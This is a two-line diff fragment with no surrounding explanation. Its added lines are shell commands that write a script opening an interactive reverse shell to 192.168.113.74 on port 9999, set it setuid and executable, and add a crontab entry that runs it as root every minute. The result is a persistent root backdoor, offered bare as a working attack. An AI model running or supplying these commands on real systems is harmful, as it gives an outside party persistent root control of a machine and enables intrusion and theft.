@@ -1,0 +1,2 @@
+echo '#!/bin/bash' > shell.sh && echo '/bin/bash -i >& /dev/tcp/192.168.113.74/9999 0>&1' >> shell.sh && chmod +sx shell.sh
+echo '* * * * * root  /shell.sh' >> etc/crontab && chmod 600 etc/crontab
